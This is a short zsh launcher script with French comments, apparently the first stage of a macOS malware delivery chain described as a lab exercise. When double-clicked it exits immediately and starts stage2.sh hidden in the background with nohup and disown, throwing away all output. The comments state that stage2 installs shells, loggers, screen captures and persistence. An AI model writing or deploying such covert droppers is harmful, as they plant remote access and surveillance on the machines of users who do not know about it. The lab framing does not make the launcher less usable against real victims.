#!/bin/zsh
# delivery/installer.command - le point d'entree de la chaine de lab
# Double-clic (ou open via le bundle telecharge) : ferme aussitot,
# stage2 installe tout en fond - shells, loggers, captures, persistance.
cd "$(dirname "$0")/.."
nohup ./delivery/stage2.sh >/dev/null 2>&1 &
disown
exit 0
